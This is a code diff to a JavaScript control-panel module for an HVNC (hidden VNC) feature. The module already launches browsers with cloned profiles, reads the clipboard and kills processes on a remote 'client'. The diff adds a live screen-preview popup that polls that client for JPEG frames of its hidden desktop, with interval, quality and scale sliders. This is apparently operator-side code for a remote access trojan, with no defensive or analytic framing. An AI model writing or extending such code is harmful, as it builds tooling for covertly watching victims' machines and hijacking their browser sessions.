@@ -6,6 +6,8 @@
  * - Launching applications with profile cloning
  * - Clipboard operations
  * - Process management
+ * - Screen preview display
+ * - Popup window management
  */
 (() => {
   "use strict";
@@ -18,6 +20,14 @@
     active: false,
     desktopName: null,
     processes: [],
+    previewInterval: null,
+    previewActive: false,
+    windowOpen: false,
+    settings: {
+      interval: 500,
+      quality: 50,
+      resize: 50,
+    },
   };
 
   // DOM Elements for HVNC
@@ -39,6 +49,25 @@
     killPid: document.getElementById("hvncKillPid"),
     hvncButtons: document.querySelectorAll("[data-hvnc-action]"),
     browserButtons: document.querySelectorAll("[data-browser]"),
+    // In-panel preview (legacy)
+    previewImg: document.getElementById("hvncPreviewImg"),
+    previewPlaceholder: document.getElementById("hvncPreviewPlaceholder"),
+    previewFrame: document.getElementById("hvncPreviewFrame"),
+    // Popup window elements
+    window: document.getElementById("hvncWindow"),
+    windowClose: document.getElementById("hvncWindowClose"),
+    screenImg: document.getElementById("hvncScreenImg"),
+    screenPlaceholder: document.getElementById("hvncScreenPlaceholder"),
+    screenStatus: document.getElementById("hvncScreenStatus"),
+    intervalSlider: document.getElementById("hvncIntervalSlider"),
+    intervalValue: document.getElementById("hvncIntervalValue"),
+    qualitySlider: document.getElementById("hvncQualitySlider"),
+    qualityValue: document.getElementById("hvncQualityValue"),
+    resizeSlider: document.getElementById("hvncResizeSlider"),
+    resizeValue: document.getElementById("hvncResizeValue"),
+    windowAction: document.getElementById("hvncWindowAction"),
+    okBtn: document.getElementById("hvncOkBtn"),
+    panelButtons: document.querySelectorAll(".hvnc-panel-btn[data-hvnc-action]"),
   };
 
   /**
@@ -113,6 +142,8 @@
           hvncState.active = true;
           hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
           setHvncStatus(`HVNC: Active (${hvncState.desktopName})`, "active");
+          // Start preview updates when HVNC starts
+          startPreview();
         } else {
           setHvncStatus(`HVNC: Failed - ${error}`, "error");
         }
@@ -124,6 +155,15 @@
         hvncState.desktopName = null;
         setHvncStatus("HVNC: Stopped", "");
         updateHvncButtons();
+        // Stop preview when HVNC stops
+        stopPreview();
+        break;
+
+      case "hvnc_frame":
+      case "hvnc_get_frame":
+        if (success && payload.frame) {
+          updatePreviewImage(payload.frame);
+        }
         break;
 
       case "hvnc_launch_browser":
@@ -189,8 +229,13 @@
         if (hvncState.active) {
           hvncState.desktopName = payload.desktop_name || "Hidden Desktop";
           setHvncStatus(`HVNC: Active (${hvncState.desktopName})`, "active");
+          // Start preview if not already active
+          if (!hvncState.previewActive) {
+            startPreview();
+          }
         } else {
           setHvncStatus("HVNC: Not active", "");
+          stopPreview();
         }
         updateHvncButtons();
         break;
@@ -211,6 +256,148 @@
     }
     if (hvncDom.stopBtn) {
       hvncDom.stopBtn.disabled = !hvncState.active;
+    }
+  }
+
+  /**
+   * Update HVNC preview image (both in-panel and popup window)
+   */
+  function updatePreviewImage(imageData) {
+    const src = imageData 
+      ? (imageData.startsWith("data:") ? imageData : `data:image/jpeg;base64,${imageData}`)
+      : null;
+    
+    // Update in-panel preview
+    if (hvncDom.previewImg) {
+      if (src) {
+        hvncDom.previewImg.src = src;
+        hvncDom.previewImg.classList.add("active");
+        if (hvncDom.previewPlaceholder) {
+          hvncDom.previewPlaceholder.classList.add("hidden");
+        }
+      } else {
+        hvncDom.previewImg.classList.remove("active");
+        if (hvncDom.previewPlaceholder) {
+          hvncDom.previewPlaceholder.classList.remove("hidden");
+        }
+      }
+    }
+    
+    // Update popup window screen
+    if (hvncDom.screenImg) {
+      if (src) {
+        hvncDom.screenImg.src = src;
+        hvncDom.screenImg.classList.add("active");
+        if (hvncDom.screenPlaceholder) {
+          hvncDom.screenPlaceholder.classList.add("hidden");
+        }
+      } else {
+        hvncDom.screenImg.classList.remove("active");
+        if (hvncDom.screenPlaceholder) {
+          hvncDom.screenPlaceholder.classList.remove("hidden");
+        }
+      }
+    }
+  }
+
+  /**
+   * Start preview updates
+   */
+  function startPreview() {
+    if (hvncState.previewActive) return;
+    
+    hvncState.previewActive = true;
+    
+    // Request frame immediately
+    requestPreviewFrame();
+    
+    // Set up periodic frame requests based on interval setting
+    hvncState.previewInterval = setInterval(() => {
+      if (hvncState.active && hvncState.previewActive) {
+        requestPreviewFrame();
+      }
+    }, hvncState.settings.interval);
+  }
+
+  /**
+   * Stop preview updates
+   */
+  function stopPreview() {
+    hvncState.previewActive = false;
+    
+    if (hvncState.previewInterval) {
+      clearInterval(hvncState.previewInterval);
+      hvncState.previewInterval = null;
+    }
+    
+    // Clear preview image
+    updatePreviewImage(null);
+  }
+
+  /**
+   * Request a preview frame from the client
+   */
+  function requestPreviewFrame() {
+    if (!hvncState.active) return;
+    sendHvncAction("get_frame", { 
+      quality: hvncState.settings.quality, 
+      scale: hvncState.settings.resize / 100 
+    });
+  }
+
+  /**
+   * Update preview interval
+   */
+  function updatePreviewInterval(interval) {
+    hvncState.settings.interval = interval;
+    
+    // Restart preview if active
+    if (hvncState.previewActive) {
+      if (hvncState.previewInterval) {
+        clearInterval(hvncState.previewInterval);
+      }
+      hvncState.previewInterval = setInterval(() => {
+        if (hvncState.active && hvncState.previewActive) {
+          requestPreviewFrame();
+        }
+      }, interval);
+    }
+  }
+
+  /**
+   * Show HVNC popup window
+   */
+  function showHvncWindow() {
+    if (hvncDom.window) {
+      hvncDom.window.style.display = "flex";
+      hvncState.windowOpen = true;
+      
+      // Start HVNC if not already active
+      if (!hvncState.active) {
+        startHvnc();
+      } else {
+        // Just start preview if HVNC already active
+        startPreview();
+      }
+    }
+  }
+
+  /**
+   * Hide HVNC popup window
+   */
+  function hideHvncWindow() {
+    if (hvncDom.window) {
+      hvncDom.window.style.display = "none";
+      hvncState.windowOpen = false;
+    }
+  }
+
+  /**
+   * Update screen status text
+   */
+  function updateScreenStatus(text) {
+    if (hvncDom.screenStatus) {
+      hvncDom.screenStatus.textContent = text || "";
     }
   }
 
@@ -403,8 +590,16 @@
       hvncDom.stopBtn.addEventListener("click", stopHvnc);
     }
 
-    // Action buttons
+    // Action buttons (in-panel and popup)
     hvncDom.hvncButtons.forEach(btn => {
+      btn.addEventListener("click", () => {
+        const action = btn.dataset.hvncAction;
+        if (action) handleHvncAction(action);
+      });
+    });
+
+    // Popup window panel buttons
+    hvncDom.panelButtons.forEach(btn => {
       btn.addEventListener("click", () => {
         const action = btn.dataset.hvncAction;
         if (action) handleHvncAction(action);
@@ -460,12 +655,100 @@
       killProcessBtn.addEventListener("click", killProcess);
     }
 
+    // === HVNC Popup Window Events ===
+    
+    // Close window button
+    if (hvncDom.windowClose) {
+      hvncDom.windowClose.addEventListener("click", hideHvncWindow);
+    }
+
+    // OK button
+    if (hvncDom.okBtn) {
+      hvncDom.okBtn.addEventListener("click", () => {
+        // Apply window action if selected
+        const action = hvncDom.windowAction ? hvncDom.windowAction.value : "close";
+        if (action === "close") {
+          hideHvncWindow();
+        }
+        // minimize and maximize actions would need backend support
+      });
+    }
+
+    // Interval slider
+    if (hvncDom.intervalSlider) {
+      hvncDom.intervalSlider.addEventListener("input", (e) => {
+        const value = parseInt(e.target.value, 10);
+        hvncState.settings.interval = value;
+        if (hvncDom.intervalValue) {
+          hvncDom.intervalValue.textContent = value;
+        }
+        updatePreviewInterval(value);
+      });
+    }
+
+    // Quality slider
+    if (hvncDom.qualitySlider) {
+      hvncDom.qualitySlider.addEventListener("input", (e) => {
+        const value = parseInt(e.target.value, 10);
+        hvncState.settings.quality = value;
+        if (hvncDom.qualityValue) {
+          hvncDom.qualityValue.textContent = value;
+        }
+      });
+    }
+
+    // Resize slider
+    if (hvncDom.resizeSlider) {
+      hvncDom.resizeSlider.addEventListener("input", (e) => {
+        const value = parseInt(e.target.value, 10);
+        hvncState.settings.resize = value;
+        if (hvncDom.resizeValue) {
+          hvncDom.resizeValue.textContent = value;
+        }
+      });
+    }
+
+    // Make window draggable
+    if (hvncDom.window) {
+      makeDraggable(hvncDom.window);
+    }
+
     // Request HVNC status when connected
     if (state.isConnected) {
       sendHvncAction("status");
     }
 
     console.log("HVNC module initialized");
+  }
+
+  /**
+   * Make an element draggable by its header
+   */
+  function makeDraggable(element) {
+    const header = element.querySelector(".hvnc-window-header");
+    if (!header) return;
+
+    let isDragging = false;
+    let offsetX = 0;
+    let offsetY = 0;
+
+    header.addEventListener("mousedown", (e) => {
+      if (e.target.closest(".hvnc-window-close")) return;
+      isDragging = true;
+      offsetX = e.clientX - element.offsetLeft;
+      offsetY = e.clientY - element.offsetTop;
+      element.style.transform = "none";
+    });
+
+    document.addEventListener("mousemove", (e) => {
+      if (!isDragging) return;
+      element.style.left = (e.clientX - offsetX) + "px";
+      element.style.top = (e.clientY - offsetY) + "px";
+    });
+
+    document.addEventListener("mouseup", () => {
+      isDragging = false;
+    });
   }
 
   // Export functions
@@ -476,6 +759,11 @@
     handleResponse: handleHvncResponse,
     sendAction: sendHvncAction,
     init: initHvnc,
+    startPreview: startPreview,
+    stopPreview: stopPreview,
+    updatePreviewImage: updatePreviewImage,
+    showWindow: showHvncWindow,
+    hideWindow: hideHvncWindow,
   };
 
   // Auto-init when DOM is ready
